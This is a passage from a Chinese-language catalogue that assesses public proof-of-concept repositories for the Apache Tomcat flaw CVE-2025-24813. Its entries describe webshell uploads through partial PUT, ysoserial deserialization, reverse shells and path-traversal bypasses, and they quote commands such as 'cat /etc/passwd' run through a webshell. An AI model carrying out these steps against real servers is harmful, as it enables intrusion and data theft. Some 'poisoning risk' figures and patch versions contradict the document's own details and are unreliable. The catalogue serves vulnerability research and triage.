3.  **代码本身:** 仓库中作者可能在`POC-Exploit_CVE_2025_24813.py`隐藏了后门，导致使用者在不知情的情况下执行了恶意代码。

基于上述分析，投毒风险评估为 10%。

**利用方式总结：**

1.  **漏洞利用入口：** 通过构造恶意的 HTTP PUT 请求，利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 特性。
2.  **路径等效性：** 攻击者利用路径等效性问题（例如，`file.Name` 中的内部点），访问或操作受保护的文件。
3.  **信息泄露/内容注入：** 如果攻击者能够满足上述条件，则可以覆盖或注入恶意代码到服务器的敏感文件中。
4.  **远程代码执行：** 如果目标应用使用了 Tomcat 的文件 session 持久化，并且存在可利用的反序列化库，攻击者可以通过上传恶意 session 文件，触发反序列化漏洞，从而执行任意代码。
5.  **绕过WAF：** PoC 代码中包含 WAF 绕过功能，通过修改 Headers 或者对 Payload 进行拆分等方式，尝试绕过 WAF 的检测。

**项目地址:** [Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution](https://github.com/Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #16

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, 9.0.0.M1 to 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT enabled, application using Tomcat's file-based session persistence with the default storage location, application includes a library that may be leveraged in a deserialization attack 或 writes enabled for the default servlet, support for partial PUT, target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者通过利用 'file.Name' (Internal Dot) 机制，结合启用了写入功能的 Default Servlet 和部分 PUT 请求支持，可以执行远程代码或进行信息泄露，甚至向上传的文件添加恶意内容。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞已被公开，并且有证据表明已被积极利用。虽然提供的 PoC 代码本身只包含一个 README.md 文件，无法直接证明漏洞的利用，但根据搜索结果，完整的利用链是存在的，并且漏洞本身是可被利用的。这个README.md只是一个占位符，提示存在利用代码。需要进一步搜索才能找到真正可用的POC。

**投毒风险评估：** 提供的 PoC 代码（README.md）非常简单，只包含标题，没有可执行的代码，因此**几乎**不存在直接的投毒风险。风险占比为1%。

**利用方式分析：**

利用 CVE-2025-24813 漏洞有两种主要方式：

1.  **远程代码执行 (RCE)：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。 （默认禁用）
        *   启用了部分 PUT 请求支持。 （默认启用）
        *   应用程序使用 Tomcat 的基于文件的会话持久化，并且使用默认存储位置。
        *   应用程序包含可用于反序列化攻击的库。
    *   攻击过程：攻击者利用部分 PUT 请求上传恶意文件到 Tomcat 的会话存储目录，然后通过反序列化漏洞执行任意代码。

2.  **信息泄露和恶意内容添加：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。（默认禁用）
        *   启用了部分 PUT 请求支持。（默认启用）
        *   存在安全敏感上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
        *   攻击者知道安全敏感文件的名称。
        *   安全敏感文件也通过部分 PUT 上传。
    *   攻击过程：攻击者利用路径等价漏洞，通过部分 PUT 请求上传恶意文件，覆盖或修改目标 URL 下的安全敏感文件，从而导致信息泄露或向上传的文件添加恶意内容。

总而言之，该漏洞允许未经身份验证的攻击者在满足特定条件的情况下执行远程代码或进行信息泄露，需要尽快修复。


**项目地址:** [Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE](https://github.com/Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #17

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需满足以下条件之一：

1.  信息泄露/内容注入：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, security sensitive files also being uploaded via partial PUT。
2.  远程代码执行：writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个存在于Apache Tomcat中的路径等价漏洞，攻击者利用'file.Name'中的内部点，结合启用了写入的Default Servlet，可能导致远程代码执行、信息泄露或向上传文件中添加恶意内容。

**漏洞利用方式：**

此漏洞主要通过利用Tomcat的partial PUT特性和文件路径处理不当来实现。

1. **信息泄露/内容注入：** 攻击者首先需要Default Servlet开启了写入功能，并支持partial PUT。他们可以利用此漏洞上传恶意文件，或者修改已存在的文件内容，进行恶意内容注入，或者泄露安全敏感文件内容，需要利用精心构造的路径来实现攻击。例如，将恶意文件上传到公共目录的子目录下，利用Internal Dot来覆盖其他文件。

2. **远程代码执行：** 如果Tomcat启用了文件存储session，并且应用包含可被反序列化攻击的库，攻击者可以通过上传恶意的序列化文件，并覆盖Tomcat session文件，最终实现RCE。

**POC有效性分析：**

根据提供的POC代码，该脚本尝试通过PUT请求上传一个session文件，然后通过GET请求访问包含session ID的JSP页面。如果GET请求返回500错误，则认为目标存在漏洞，原因是上传的恶意session文件导致了反序列化异常。此方法可能可以验证漏洞的存在性，但需要目标环境满足特定的配置要求（例如，启用文件session存储并存在易受攻击的反序列化库）。搜索引擎结果也表明此漏洞在野外被积极利用。

**投毒风险分析：**

POC代码本身主要是漏洞验证，并无明显的恶意投毒行为。代码中使用了requests库进行HTTP请求，并根据响应状态码判断漏洞是否存在。 但是仍然存在一些风险：

*   **依赖风险：** 代码依赖于requests、pandas和colorama库，这些库可能存在安全漏洞，如果使用了被篡改的库，则可能引入安全风险。
*   **代码执行风险：** 虽然代码本身没有直接的恶意行为，但如果攻击者修改了代码，例如添加了反向shell等恶意逻辑，则可能实现远程代码执行。
*   **误报风险：** 如果目标服务器存在WAF或其他安全防护措施，可能会导致扫描结果出现误报。

综合考虑，此POC代码的投毒风险较低，大概为5%。主要风险在于对第三方库的依赖以及代码被篡改的可能性。

**项目地址:** [Mattb709/CVE-2025-24813-Scanner](https://github.com/Mattb709/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #18

**来源**: [CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md](../2025/CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/路径穿越

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet开启写入功能（默认关闭），支持partial PUT（默认开启），以及目标URL为公共上传URL的子目录，攻击者需要知道敏感文件名，并且敏感文件也通过partial PUT上传。 或者需要应用使用Tomcat的基于文件的session持久化，并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，允许攻击者通过构造包含 `../` 序列的恶意请求，绕过路径验证，从而实现远程代码执行或信息泄露。

**有效性：**
根据漏洞库信息、搜索结果以及提供的PoC代码，可以判断该PoC代码有效。搜索结果中多个来源表明该漏洞已被实际利用，并且存在公开的PoC。PoC代码展示了如何利用 PUT 方法上传包含恶意代码的 JSP 文件到 Tomcat 的 webapps 目录，从而实现远程代码执行。

**投毒风险：**
提供的PoC代码的主要功能是上传一个包含命令执行功能的 JSP 文件。该JSP文件允许攻击者通过 GET 参数 `cmd` 执行任意系统命令。PoC本身的功能是直接的，并没有发现隐藏的、非预期的恶意行为，例如：
*   篡改系统文件
*   植入持久性后门
*   窃取敏感信息并外传
*   利用其他漏洞
因此，根据现有信息，可以认为投毒风险较低。虽然使用了Runtime.getRuntime().exec来执行命令，但是这个是PoC的需要，目的是验证RCE。判断为0%.

**利用方式：**
1.  **利用条件确认：** 目标Tomcat服务器需要满足以下条件：
    *   默认Servlet开启写入功能（`readonly` 参数设置为 `false`）。
    *   支持 partial PUT 请求（默认开启）。
    *  攻击目标满足特定的文件存储结构和命名规则(参考漏洞描述)
    *   或者应用使用了Tomcat的基于文件的session持久化机制且包含可用于反序列化攻击的库
2.  **恶意JSP上传：** 攻击者使用 PUT 方法，将包含恶意代码的 JSP 文件上传到 Tomcat 服务器。PoC 中使用了路径穿越技巧（`../`），将文件上传到 webapps/ROOT 目录下，从而绕过访问限制。
3.  **命令执行：** 攻击者通过访问上传的 JSP 文件，并传递 `cmd` 参数，执行任意系统命令。PoC 中演示了如何使用 `cat /etc/passwd` 命令读取系统密码文件。

**搜索引擎结果总结：**
搜索结果表明该漏洞已存在实际攻击案例，并且 CISA 已将其添加到已知被利用漏洞目录中。多个安全厂商和博客都对该漏洞进行了分析和披露，并提供了检测和缓解建议。

**项目地址:** [MuhammadWaseem29/CVE-2025-24813](https://github.com/MuhammadWaseem29/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #19

**来源**: [CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md](../2025/CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 对于路径等价漏洞：默认Servlet启用写入权限，支持partial PUT，存在目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且敏感文件通过partial PUT上传。对于反序列化漏洞：默认Servlet启用写入权限，支持partial PUT，应用程序使用Tomcat基于文件的session持久化默认存储位置，应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它涉及到路径等价和反序列化两个方面。路径等价漏洞允许攻击者通过特殊的路径构造（例如使用内部点 `.Name`）来访问或修改受保护的文件。如果同时启用了 Default Servlet 的写入权限和 Partial PUT 支持，攻击者可以上传恶意文件，导致信息泄露或远程代码执行。反序列化漏洞则允许攻击者通过上传包含恶意序列化数据的 session 文件，结合 Tomcat 的文件 session 持久化机制以及应用程序中存在的易受攻击的反序列化库，最终实现远程代码执行。

漏洞利用方式：

1.  **路径等价攻击：** 攻击者利用 `file.Name` 这样的路径构造绕过访问控制，结合 Default Servlet 的写入权限和 Partial PUT 支持，上传恶意 JSP 文件或覆盖现有的配置文件。
2.  **反序列化攻击：** 攻击者首先确定目标应用程序使用了 Tomcat 的默认文件 session 持久化位置，然后构造恶意的序列化 payload，该 payload 利用应用程序依赖中的反序列化漏洞执行任意代码。 攻击者通过 Partial PUT 上传包含此 payload 的 session 文件到 Tomcat 的 session 存储目录，当 Tomcat 反序列化该 session 时，payload 被触发，导致远程代码执行。

提供的 POC 代码 `CVE-2025-24813_POC.py` 旨在利用反序列化漏洞。代码中包含了一个 Java 序列化 payload (payload_01)，它被编码为十六进制字符串。 该 payload 似乎是为了利用 `TemplatesImpl` 类中的漏洞来执行任意代码。 脚本首先尝试连接到目标 Tomcat 服务器，然后使用 Partial PUT 请求上传包含恶意 payload 的文件。  payload 包含占位符 {payload}，说明此exp并非完整，需要二次编辑才可使用。

有效性分析： 根据提供的代码片段，结合漏洞描述， 该POC 代码利用反序列化漏洞，因此，在满足反序列化漏洞的条件时，POC有效。

投毒风险分析：POC 代码中使用了硬编码的 payload 和目标 URL。攻击者可以很容易地修改这些参数以执行恶意操作，例如上传后门或窃取敏感数据，而不仅仅是执行简单的命令。  因此，该 POC 具有高投毒风险。并且其中存在占位符，说明需要进行二次编辑,那么投毒风险就是百分之百。


**项目地址:** [N0c1or/CVE-2025-24813_POC](https://github.com/N0c1or/CVE-2025-24813_POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #20

**来源**: [CVE-2025-24813-Olabanji10_Apache-GOExploiter.md](../2025/CVE-2025-24813-Olabanji10_Apache-GOExploiter.md)

## CVE-2025-24813

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要开启Default Servlet的写入功能，允许Partial PUT，并且满足特定的目录结构或使用Tomcat的文件Session持久化机制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。如果满足以下条件，攻击者可以进行远程代码执行或泄露敏感信息:

1.  **信息泄露/恶意内容注入:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   存在安全敏感文件上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件通过 Partial PUT 上传。

2.  **远程代码执行:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的 Session 持久化，使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**漏洞利用方式：**

*   **信息泄露/恶意内容注入：** 攻击者可以利用路径等价漏洞，通过构造恶意请求，覆盖或读取特定的安全敏感文件。
*   **远程代码执行：** 攻击者利用 Partial PUT 功能上传恶意构造的序列化 session 文件，并结合目标应用中存在的可被利用的反序列化漏洞，最终实现远程代码执行。

**POC分析：**

提供的 Go 代码通过 PUT 方法上传 JSP webshell 到多个预定义的目录中。它首先检测目标是否是Tomcat服务器，然后尝试在不同的目录下上传 `update_log.jsp` 文件，其中包含一个简单的命令执行界面。如果上传成功，它会将 URL 写入到 `Shelled.txt` 文件中。

**投毒风险分析：**

该POC代码的主要目的是利用漏洞上传webshell，本身没有明显的投毒行为。虽然webshell本身是一种恶意代码，但是这是漏洞利用的一部分，不应被视为投毒。 风险评估为5%。

**搜索引擎结果：**

多个搜索结果表明 CVE-2025-24813 漏洞已经被积极利用，远程代码执行是主要的攻击目标。

**项目地址:** [Olabanji10/Apache-GOExploiter](https://github.com/Olabanji10/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #21

**来源**: [CVE-2025-24813-Shivshantp_CVE-2025-24813.md](../2025/CVE-2025-24813-Shivshantp_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat PUT JSP RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要目标Tomcat实例启用默认servlet的写入功能 (disabled by default) 和 支持 partial PUT (enabled by default)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中一个路径等价漏洞，允许未经身份验证的攻击者通过 PUT 请求上传恶意 JSP 文件来执行远程代码。漏洞利用依赖于两个关键配置：1. Tomcat 默认 Servlet 的写入功能必须启用（默认情况下禁用）。 2. 必须支持 partial PUT（默认启用）。

**有效性：**
根据提供的漏洞利用代码（`exploit/1. exploit_cve_2025_24813.py`），该 PoC 尝试通过 PUT 请求将一个包含命令执行功能的 JSP webshell 上传到目标 Tomcat 服务器，默认路径为 `/shell.jsp`。 成功上传后，该 PoC 尝试通过发送带有 `cmd` 参数的 GET 请求来执行系统命令，验证是否成功执行远程代码。

**投毒风险：**
该仓库主要包含漏洞利用脚本，webshell 以及 Dockerfile 等配置，作者在docker配置中创建了`/usr/local/tomcat/conf/Catalina/localhost/ROOT.xml`,并设置了`<Context privileged='true' antiResourceLocking='false' swallowOutput='true' />`, 如果docker hub上存在投毒行为,可能会导致用户的敏感信息泄露。经过分析，未发现明显的恶意代码或后门。`exploit/2.shell.jsp` 只是webshell 的另一个副本，与PoC脚本一致。总体来说，代码的投毒风险较低，约为5%。

**利用方式：**
1.  **前提条件检查：** 确保目标 Tomcat 服务器满足漏洞利用的条件（默认 Servlet 写入已启用，支持 partial PUT）。
2.  **上传恶意 JSP 文件：** 使用 PUT 请求将包含恶意代码的 JSP 文件（如 `shell.jsp`）上传到目标服务器。`exploit/1. exploit_cve_2025_24813.py` 脚本即实现了此步骤。
3.  **执行远程代码：** 成功上传 JSP 文件后，通过访问该文件并传递命令参数（如 `shell.jsp?cmd=whoami`）来执行任意系统命令。

**缓解措施：**
*   升级到受影响的 Apache Tomcat 版本的修复版本 (11.0.3, 10.1.35, or 9.0.98).
*   禁用默认 servlet 的写入功能。
*   限制对 Tomcat 服务器的访问权限。

**项目地址:** [Shivshantp/CVE-2025-24813](https://github.com/Shivshantp/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #22

**来源**: [CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md](../2025/CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE), 信息泄露, 文件覆盖

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意文件上传

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 以下条件全部满足时，可导致信息泄露和/或文件覆盖：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），安全敏感上传的目标URL是公共上传目标URL的子目录，攻击者知道安全敏感文件的名称，且安全敏感文件也通过部分PUT上传。以下条件全部满足时，可导致远程代码执行：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），应用程序使用Tomcat基于文件的会话持久化和默认存储位置，应用程序包含可能在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 的路径等价处理中，攻击者可以通过利用 'file.Name' (内部点) 绕过安全检查。此漏洞可能导致远程代码执行、信息泄露，或通过启用了写入功能的默认Servlet将恶意内容添加到已上传的文件中。根据漏洞库信息和搜索结果，利用条件较为苛刻，需要特定的配置，如启用默认Servlet写入、支持部分PUT等。漏洞利用代码 `CVE_2025_24813.py` 尝试通过 PUT 请求上传恶意 payload 到会话文件存储目录，如果成功，可以触发反序列化漏洞，实现远程代码执行。代码包含检查 Servlet 是否可写的函数 `check_writable_servlet`，以及生成 ysoserial payload 的函数 `generate_ysoserial_payload`或者Java Payload的函数 `generate_java_payload`。该利用方式依赖于 Tomcat 的文件型 session 持久化机制，以及服务器上存在可被利用的反序列化 gadget。 鉴于代码可能包含恶意 payload 生成和上传功能，存在高风险的投毒可能性。

**项目地址:** [absholi7ly/POC-CVE-2025-24813](https://github.com/absholi7ly/POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #23

**来源**: [CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md](../2025/CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet的写入启用(readonly=false, allowPut=true, allowPartialPut=true)，应用使用Tomcat的文件Session持久化存储，应用包含可用于反序列化攻击的library

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，该漏洞允许攻击者在满足特定条件的情况下执行任意代码。

**漏洞利用有效性分析：**

根据搜索引擎结果，该漏洞在发布后不久就出现了在野利用，多个安全厂商也发布了相关的分析报告和检测规则，表明该漏洞具有较高的实际威胁性。POC代码中，通过修改`web.xml`文件，开启了默认Servlet的写入权限和PUT方法，然后利用ysoserial生成反序列化payload，通过分块PUT请求上传payload，最后访问特定URL触发反序列化，从而执行反弹shell命令。如果目标环境符合漏洞描述中的所有条件（Default Servlet 开启写入、支持 partial PUT、使用文件session存储、存在可利用的反序列化库），那么该POC代码可以有效实现RCE。

**投毒风险分析：**

POC代码主要由shell脚本和Dockerfile组成。脚本负责构建、运行Tomcat镜像、生成payload、上传payload、触发漏洞等操作。Dockerfile用于构建包含漏洞环境的Tomcat镜像。仔细检查这些文件，发现潜在的投毒点可能在于:

*   **ysoserial payload生成：** 脚本使用`ysoserial.jar`生成payload，如果攻击者替换了`ysoserial.jar`文件，可能会植入恶意代码。但是脚本中包含了直接从`https://jitpack.io/com/github/frohoff/ysoserial/master-b7d0f27b46-1/ysoserial-master-b7d0f27b46-1.jar`下载`ysoserial.jar` 的代码，除非该链接被篡改，否则可以排除。虽然存在该风险，但因为是从已知源下载，所以该风险相对较低。
*   **Dockerfile修改：** Dockerfile通过sed命令修改`web.xml`文件，开启了`readonly=false`。如果`sed`命令被篡改，可能导致其他恶意配置。

总体来说，该POC代码的投毒风险较低，因为所有操作都相对透明，且依赖已知的工具和配置。最主要的风险在于ysoserial的下载源被篡改的可能性。因此，投毒风险评估为5%。

**漏洞利用方式：**

1.  **环境准备：** 构建包含漏洞版本的Apache Tomcat环境。Dockerfile中配置了允许PUT请求，这是一个关键的先决条件。
2.  **Payload生成：** 使用ysoserial工具，结合CommonsBeanutils1链，生成包含反弹shell命令的序列化payload。
3.  **Payload上传：** 通过分块PUT请求，将payload上传到服务器。
4.  **触发反序列化：** 访问特定的URL，触发反序列化漏洞，执行payload中的命令，从而获得反弹shell。

**项目地址:** [beyond-devsecops/CVE-2025-24813](https://github.com/beyond-devsecops/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #24

**来源**: [CVE-2025-24813-brs6412_CVE-2025-24813.md](../2025/CVE-2025-24813-brs6412_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-Path Equivalence/Deserialization

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** Default Servlet 启用写入 (默认禁用), 启用 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录（对于信息泄露），或者应用使用 Tomcat 的基于文件的会话持久化且使用默认存储位置，以及应用程序包含可能被利用于反序列化攻击的库（对于 RCE）。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

根据CVE信息和搜索结果，CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，与DefaultServlet处理文件上传的逻辑相关。如果启用了 DefaultServlet 的写入功能，并且启用了 partial PUT 支持，攻击者可以通过构造包含 `file.Name` (内部点) 的路径来覆盖敏感文件或执行恶意代码。漏洞可能导致远程代码执行、信息泄露，或向已上传文件中添加恶意内容。

**有效性：**

提供的代码是一个利用反序列化漏洞进行远程代码执行的POC。它包含一个易受攻击的Servlet（`ExploitServlet.java`），该Servlet接受序列化的Java对象，并使用 `ObjectInputStream` 对其进行反序列化。`SafeGadget.java` 中提供了一个简单的Gadget，它在反序列化时会写入`/tmp/pwn.txt`。利用方式是上传恶意构造的序列化对象到 `/vuln-app/vulnerable_endpoint`，触发反序列化，从而执行任意代码。结合CVE描述，如果Tomcat配置允许，并满足利用条件（partial PUT, session持久化等），则该POC有效。

**投毒风险：**

从代码上看，投毒的概率较低（约 5%）。主要风险点在于`SafeGadget.java`。尽管名称是 "SafeGadget"，但它实际上执行了文件写入操作。这本身不是投毒，而是漏洞利用的一部分。真正的投毒风险可能在于：

1.  **更隐蔽的后门：** 虽然给出的例子写入 "Pwned!" 到文件，但实际的Gadget可能执行更隐蔽的操作，例如添加用户、执行系统命令等。
2.  **供应链投毒：** 如果攻击者能够控制构建环境，他们可能会修改 `ExploitServlet.java` 或添加额外的依赖项，从而引入后门或恶意功能。

由于给出的代码非常简单，并且漏洞利用的目的是明确的（通过反序列化写入文件），因此直接投毒的风险相对较低。但是，在实际的利用场景中，攻击者可能会使用更复杂的Gadget，从而隐藏恶意行为。

**利用方式：**

1.  **信息泄露/文件覆盖：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   目标 URL 是公共上传 URL 的子目录
    *   攻击者知道敏感文件名
    *   敏感文件也使用 partial PUT 上传
    攻击者可以使用路径等价绕过，例如 `public_upload/../../sensitive_file.txt` 覆盖敏感文件。
2.  **远程代码执行：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   应用使用 Tomcat 的基于文件的会话持久化和默认存储位置
    *   应用包含可用于反序列化攻击的库
    攻击者可以利用反序列化漏洞，例如通过上传恶意构造的序列化session文件到session存储目录中，从而执行任意代码。POC代码展示了基本的反序列化利用方式。实际利用中，需要找到Tomcat实例中可用的Gadget链。 

**项目地址:** [brs6412/CVE-2025-24813](https://github.com/brs6412/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #25

**来源**: [CVE-2025-24813-charis3306_CVE-2025-24813.md](../2025/CVE-2025-24813-charis3306_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价及反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (默认开启), 文件会话持久化启用 (PersistentManager 和 FileStore 配置), 存在反序列化利用链

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中的一个路径等价漏洞，结合反序列化漏洞，可能导致远程代码执行。利用方式是攻击者通过 Partial PUT 请求上传恶意序列化 payload，覆盖 session 文件，从而触发反序列化漏洞，执行任意代码。

**漏洞利用过程：**
1.  **配置条件：** 确保 Tomcat 启用了 DefaultServlet 的写入功能，支持 Partial PUT 请求，并且开启了文件会话持久化。
2.  **上传Payload：** 攻击者构造一个包含恶意代码的序列化对象，并将其分块通过 Partial PUT 请求上传到 Tomcat 服务器上的 session 存储目录。
3.  **触发反序列化：** 当 Tomcat 尝试反序列化该 session 文件时，恶意代码会被执行，从而导致远程代码执行。

**投毒风险分析：**
由于该漏洞利用涉及上传恶意序列化数据，存在一定的投毒风险。攻击者可能在序列化数据中植入恶意代码，导致受害者在不知情的情况下运行这些代码。此外，公开的POC可能被篡改并传播，从而导致更多人受到攻击。

**缓解措施：**
1.  升级到 Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
2.  禁用 DefaultServlet 的写入功能 (readonly=true)。
3.  避免使用文件会话持久化。
4.  限制上传文件类型，并对上传文件进行安全检查。

**项目地址:** [charis3306/CVE-2025-24813](https://github.com/charis3306/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #26

**来源**: [CVE-2025-24813-cyglegit_CVE-2025-24813.md](../2025/CVE-2025-24813-cyglegit_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

